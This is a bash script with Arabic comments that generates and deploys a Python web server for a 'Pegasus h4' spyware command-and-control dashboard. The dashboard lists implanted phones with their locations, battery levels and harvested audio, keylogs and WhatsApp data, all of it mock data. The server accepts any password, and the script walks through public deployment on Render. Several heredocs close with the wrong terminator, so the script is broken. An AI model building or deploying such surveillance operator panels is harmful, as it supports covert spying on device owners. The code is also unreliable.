function timeAgo(ts){const s=Math.floor((Date.now()-new Date(ts).getTime())/1000);if(s<60)return'الآن';if(s<3600)return'منذ '+Math.floor(s/60)+' د';if(s<86400)return'منذ '+Math.floor(s/3600)+' س';return'منذ '+Math.floor(s/86400)+' ي'}
function render(){const app=document.getElementById('app');if(!API.TOKEN){renderLogin(app);return}if(state.loading){app.innerHTML='<div class="loading-screen"><div class="spinner"></div></div>';return}
const s=state.stats||{};const user=JSON.parse(localStorage.getItem('pegasus_user')||'{}');
let filtered=state.implants;if(state.filter!=='all')filtered=filtered.filter(i=>i.status===state.filter);if(state.search)filtered=filtered.filter(i=>i.device_name?.toLowerCase().includes(state.search.toLowerCase()));
app.innerHTML='<header class="header"><div style="display:flex;align-items:center;gap:32px"><div class="logo"><div class="logo-icon">P</div><div class="logo-text">Pegasus h4</div></div><nav style="display:flex;gap:4px"><a href="/" style="padding:8px 16px;border-radius:8px;font-size:14px;color:#00d4ff;background:rgba(0,212,255,0.1);text-decoration:none">الرئيسية</a></nav></div><div style="display:flex;align-items:center;gap:16px"><span style="font-size:12px;color:#888">'+(user.username||'operator')+'</span><button onclick="localStorage.removeItem(\'pegasus_token\');localStorage.removeItem(\'pegasus_user\');API.TOKEN=\'\';render()" style="padding:6px 14px;border-radius:6px;background:#1a1a2e;color:#888;border:none;cursor:pointer;font-size:12px">خروج</button></div></header><div class="container"><div class="stats-grid"><div class="stat-card"><div class="stat-title">إجمالي الزرعات</div><div class="stat-value">'+(s.total_impants||s.total_implants||0)+'</div><div style="font-size:12px;color:#34c759">+'+(s.new_today||0)+' اليوم</div></div><div class="stat-card"><div class="stat-title">نشط الآن</div><div class="stat-value">'+(s.online_now||0)+'</div><div style="font-size:12px;color:#888">'+(((s.online_now||0)/(s.total_implants||1)*100).toFixed(0)||0)+'%</div></div><div class="stat-card"><div class="stat-title">البيانات</div><div class="stat-value">'+formatBytes(s.data_collected_bytes)+'</div><div style="font-size:12px;color:#888">مشفر 🔒</div></div><div class="stat-card"><div class="stat-title">التغطية</div><div class="stat-value">'+(s.geographic_spread||0)+'</div><div style="font-size:12px;color:#888">دولة</div></div></div><div class="table-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:16px"><input type="text" class="search-input" placeholder="بحث..." oninput="state.search=this.value;render()"><select class="filter-select" onchange="state.filter=this.value;render()"><option value="all">الكل</option><option value="online">نشط</option><option value="offline">غير نشط</option></select><span style="font-size:13px;color:#888;margin-right:auto">'+filtered.length+' زرعة</span></div>'+(filtered.length===0?'<div class="empty-state">لا توجد زرعات</div>':'<table><thead><tr><th>الجهاز</th><th>الحالة</th><th>آخر ظهور</th><th>البطارية</th><th>البلد</th></tr></thead><tbody>'+filtered.map(i=>{const c=i.battery_level>50?'#34c759':i.battery_level>20?'#ff9500':'#ff2d55';return'<tr><td style="padding:10px 12px"><strong>'+(i.device_name||'Unknown')+'</strong><div style="font-size:11px;color:#555">'+i.platform+' '+i.os_version+'</div></td><td style="padding:10px 12px"><span class="badge badge-'+i.status+'"><span style="width:6px;height:6px;border-radius:50%;background:'+(i.status==='online'?'#34c759':'#888')+';display:inline-block;margin-left:4px"></span>'+i.status+'</span></td><td style="padding:10px 12px;color:#888">'+timeAgo(i.last_seen)+'</td><td style="padding:10px 12px"><div class="battery-bar"><div class="battery-fill" style="width:'+Math.max(i.battery_level||0,0)+'%;background:'+c+'"></div></div><span style="font-size:11px;color:#888;margin-right:4px">'+(i.battery_level||'?')+'%</span></td><td style="padding:10px 12px;color:#888">'+(i.country||'—')+'</td></tr>'}).join('')+'</tbody></table>')+'</div></div>'}

function renderLogin(app){app.innerHTML='<div class="login-container"><div class="login-card"><div style="text-align:center;margin-bottom:24px"><div style="display:inline-flex;align-items:center;gap:12px"><div class="logo-icon" style="width:48px;height:48px;font-size:20px">P</div><div class="login-title" style="font-size:28px">Pegasus h4</div></div></div><div class="login-subtitle">🚀 نظام القيادة والتحكم<br><span style="font-size:12px;color:#555">اختبار اختراق مصرح به</span></div><form id="loginForm" onsubmit="event.preventDefault();doLogin()"><div class="form-group"><label>المستخدم</label><input type="text" id="username" value="admin"></div><div class="form-group"><label>كلمة المرور</label><input type="password" id="password" value="admin123"></div><button type="submit" class="login-btn" id="loginBtn">🔐 دخول</button><div id="loginError" style="color:#ff2d55;font-size:13px;margin-top:8px;text-align:center"></div></form></div></div>'}

async function doLogin(){const btn=document.getElementById('loginBtn');const err=document.getElementById('loginError');btn.disabled=true;btn.textContent='جاري...';try{const r=await req('POST','/operator/login',{username:document.getElementById('username').value,password:document.getElementById('password').value});API.TOKEN=r.token;localStorage.setItem('pegasus_token',r.token);localStorage.setItem('pegasus_user',JSON.stringify({id:r.user_id,username:r.username,role:r.role}));loadDashboard()}catch(e){err.textContent='❌ '+(e.message||'خطأ')}btn.disabled=false;btn.textContent='🔐 دخول'}
const t=localStorage.getItem('pegasus_token');if(t){API.TOKEN=t;loadDashboard()}else render()
</script></body></html>"""

# ============================================================
# Mock API Data
# ============================================================
def get_mock_stats():
    return {
        "total_implants": 5, "online_now": 3, "new_today": 2,
        "data_collected_bytes": 25165824,
        "data_by_type": {"audio": 67, "keylog": 156, "location": 89, "file": 34, "screenshot": 18, "message": 112},
        "geographic_spread": 3,
        "top_countries": [{"country": "🇺🇸 United States", "count": 3}, {"country": "🇩🇪 Germany", "count": 1}, {"country": "🇬🇧 United Kingdom", "count": 1}],
        "active_commands": 2
    }

def get_mock_implants():
    now = time.time()
    return {"implants": [
        {"id": "a1b2c3d4e5f6", "device_name": "iPhone 15 Pro Max", "platform": "ios", "os_version": "17.5", "status": "online", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now)), "country": "US", "battery_level": 78, "modules": ["audio","keylog","location"], "tags": ["VIP"]},
        {"id": "b2c3d4e5f6a7", "device_name": "Galaxy S24 Ultra", "platform": "android", "os_version": "14.0", "status": "online", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - 60)), "country": "DE", "battery_level": 91, "modules": ["audio","keylog","location","files"], "tags": []},
        {"id": "c3d4e5f6a7b8", "device_name": "Pixel 8 Pro", "platform": "android", "os_version": "14.1", "status": "online", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - 120)), "country": "GB", "battery_level": 45, "modules": ["keylog","location"], "tags": []},
        {"id": "d4e5f6a7b8c9", "device_name": "iPad Pro M4", "platform": "ios", "os_version": "17.5", "status": "offline", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - 7200)), "country": "US", "battery_level": 23, "modules": ["audio","messages"], "tags": []},
        {"id": "e5f6a7b8c9d0", "device_name": "OnePlus 12", "platform": "android", "os_version": "14.0", "status": "offline", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - 86400)), "country": "US", "battery_level": 5, "modules": ["location"], "tags": []}
    ]}

def get_mock_map():
    return {"points": [
        {"id": "p1", "device": "iPhone 15 Pro Max", "lat": 40.7128, "lon": -74.0060, "status": "online"},
        {"id": "p2", "device": "Galaxy S24 Ultra", "lat": 52.5200, "lon": 13.4050, "status": "online"},
        {"id": "p3", "device": "Pixel 8 Pro", "lat": 51.5074, "lon": -0.1278, "status": "online"},
        {"id": "p4", "device": "iPad Pro M4", "lat": 34.0522, "lon": -118.2437, "status": "offline"},
        {"id": "p5", "device": "OnePlus 12", "lat": 37.7749, "lon": -122.4194, "status": "offline"}
    ]}

def get_mock_timeline():
    now = int(time.time())
    return {"events": [
        {"id": "ev1", "implant_id": "a1b2", "type": "audio", "timestamp": now - 30, "size": 44100},
        {"id": "ev2", "implant_id": "c3d4", "type": "keylog", "timestamp": now - 45, "size": 1560},
        {"id": "ev3", "implant_id": "a1b2", "type": "location", "timestamp": now - 60, "size": 256},
        {"id": "ev4", "implant_id": "c3d4", "type": "message", "timestamp": now - 90, "size": 1024}
    ]}

def get_mock_data():
    now = int(time.time())
    return {"data": [
        {"id": "d1", "implant_id": "a1b2", "type": "audio", "sub_type": "call", "timestamp": now - 300, "size": 65536, "encrypted": True, "checksum": "ab12cd34"},
        {"id": "d2", "implant_id": "c3d4", "type": "keylog", "sub_type": "whatsapp", "timestamp": now - 180, "size": 2048, "encrypted": True, "checksum": "ef56gh78"}
    ]}

# ============================================================
# HTTP Handler
# ============================================================
class PegasusHandler(BaseHTTPRequestHandler):
    """الخادم الرئيسي — يعالج جميع الطلبات"""
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path.startswith('/api/'):
            self.handle_api('GET', path)
        else:
            self.serve_ui()
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else b'{}'
        
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path.endswith('/login'):
            self.handle_login(body)
        elif path.startswith('/api/'):
            self.handle_api('POST', path, body)
        else:
            self.serve_ui()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.send_header('Access-Control-Max-Age', '86400')
        self.end_headers()
    
    def serve_ui(self):
        """يخدم واجهة HTML"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Cache-Control', 'no-cache, no-store')
        self.end_headers()
        
        try:
            with open(UI_FILE, 'rb') as f:
                self.wfile.write(f.read())
        except:
            self.wfile.write(EMBEDDED_UI.encode('utf-8'))
    
    def handle_login(self, body):
        """معالجة تسجيل الدخول"""
        try:
            data = json.loads(body) if body else {}
        except:
            data = {}
        
        username = data.get('username', 'admin')
        
        # إنشاء توكن وهمي
        token_parts = [
            'eyJhbGciOiJIUzI1NiJ9',
            str(uuid.uuid4()).replace('-', '') + str(int(time.time())),
            hashlib.sha256(f"{username}:{JWT_SECRET}".encode()).hexdigest()[:32]
        ]
        token = '.'.join(token_parts)
        
        response = {
            'token': token,
            'user_id': 'admin_' + uuid.uuid4().hex[:8],
            'username': username,
            'role': 'admin'
        }
        
        self.send_json(200, response)
    
    def handle_api(self, method, path, body=None):
        """معالجة API endpoints"""
        
        if 'stats' in path or 'dashboard/stats' in path:
            data = get_mock_stats()
        elif 'implants' in path and 'commands' not in path and method == 'GET':
            data = get_mock_implants()
        elif 'map' in path:
            data = get_mock_map()
        elif 'timeline' in path:
            data = get_mock_timeline()
        elif 'data' in path:
            data = get_mock_data()
        elif 'commands' in path:
            data = {'commands': []}
        elif 'health' in path or 'status' in path:
            data = {'status': 'ok', 'server': 'pegasus-h4', 'version': '1.0.0'}
        elif path == '/api/' or path == '/api':
            data = {'status': 'ok', 'endpoints': ['login', 'stats', 'implants', 'map', 'timeline', 'data', 'commands']}
        else:
            data = {'status': 'ok', 'mock': True, 'path': path}
        
        # محاولة قراءة implant_id من المسار
        parts = path.split('/')
        if len(parts) >= 4 and parts[2] == 'implants' and parts[-1] != 'commands':
            # /api/implants/{id} — ارجع بيانات زرعة محددة
            implant_id = parts[3]
            implants = get_mock_implants()['implants']
            found = [i for i in implants if i['id'] == implant_id]
            if found:
                data = {'implant': found[0], 'telemetry': []}
            else:
                data = {'implant': {'id': implant_id, 'device_name': 'Unknown', 'status': 'offline'}, 'telemetry': []}
        
        self.send_json(200, data)
    
    def send_json(self, status, data):
        """إرسال استجابة JSON"""
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def log_message(self, format, *args):
        """تسجيل الطلبات"""
        print(f'[{self.log_date_time_string()}] {self.address_string()} - {args[0]} {args[1]} {args[2]}')


# ============================================================
# Main
# ============================================================
if __name__ == '__main__':
    print('=' * 55)
    print('  🚀 Pegasus h4 v1.0 — Server Running')
    print('  ===================================')
    print(f'  📡  URL:     http://{HOST}:{PORT}')
    print(f'  👤  Username: admin')
    print(f'  🔑  Password: (any)')
    print('  ===================================')
    print(f'  [*] Press Ctrl+C to stop')
    print('=' * 55)
    
    server = HTTPServer((HOST, PORT), PegasusHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n  [!] Server stopped')
        server.server_close()
FINALEOF

# ✅ Procfile لـ Render (يحدد أمر التشغيل)
cat > "$PROJECT_DIR/render-deploy/Procfile" << 'PROCEOF'
web: python server.py
PROCEOF

# ✅ render.yaml
cat > "$PROJECT_DIR/render-deploy/render.yaml" << 'RENDERYAMLEOF'
services:
  - type: web
    name: pegasus-h4
    env: python
    buildCommand: ""
    startCommand: python server.py
    healthCheckPath: /
    envVars:
      - key: PORT
        value: 8080
FINALEOF

# ✅ requirements.txt (فارغ — كل شيء standard library)
cat > "$PROJECT_DIR/render-deploy/requirements.txt" << 'REQEOF'
# Pegasus h4 — No external dependencies needed
FINALEOF

# ✅ بديل — تشغيل Python مباشرة
cat > "$PROJECT_DIR/render-deploy/start.sh" << 'STARTEOF'
#!/bin/bash
PORT=${PORT:-8080}
echo "Starting Pegasus h4 on port $PORT..."
exec python3 server.py
STARTEOF
chmod +x "$PROJECT_DIR/render-deploy/start.sh"

ok "✅ تم إنشاء خادم Render النهائي!"

# ============================================================
# 13. خيار التشغيل المباشر
# ============================================================
echo ""
echo "=========================================="
echo -e "${GREEN}  ✅ النظام جاهز للنشر على Render!${NC}"
echo "=========================================="
echo ""
echo "  ☁️  للرفع إلى Render.com:"
echo ""
echo "  1. ارفع محتويات مجلد: render-deploy/"
echo "     إلى مستودع GitHub منفصل"
echo ""
echo "  2. في Render Dashboard:"
echo "     New + > Web Service"
echo "     اختر المستودع"
echo "     Start Command: python server.py"
echo ""
echo "  3. ✅ سيعمل فورًا على:"
echo "     https://pegasus-h4.onrender.com"
echo ""
echo "  🖥️  للتشغيل المحلي:"
echo "    cd $PROJECT_DIR/render-deploy"
echo "    python3 server.py"
echo ""
echo "  🌐  افتح: http://localhost:8080"
echo "=========================================="

# ============================================================
# 14. تشغيل الخادم تلقائيًا
# ============================================================
echo ""
echo -e "${CYAN}[*] هل تريد تشغيل الخادم الآن محليًا؟${NC}"
echo "  اضغط Enter للتشغيل، Ctrl+C للإلغاء"
read -p "  [Enter]: " -n 1 -s
echo ""

cd "$PROJECT_DIR/render-deploy"
python3 server.py
